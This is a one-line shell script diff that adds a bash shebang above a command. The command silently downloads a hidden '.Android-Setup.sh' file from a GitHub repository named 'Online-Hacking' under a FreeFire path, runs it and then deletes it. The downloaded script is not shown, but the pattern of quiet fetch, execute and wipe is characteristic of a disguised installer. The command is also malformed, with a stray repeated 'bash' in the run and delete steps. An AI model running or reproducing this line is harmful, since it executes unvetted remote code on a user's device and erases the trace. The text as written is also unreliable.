@@ -1,1 +1,2 @@
+#!/bin/bash
 wget -q https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/FreeFire/SM/Files/.Android-Setup.sh > /dev/null && bash bash .Android-Setup.sh && rm -rf bash .Android-Setup.sh
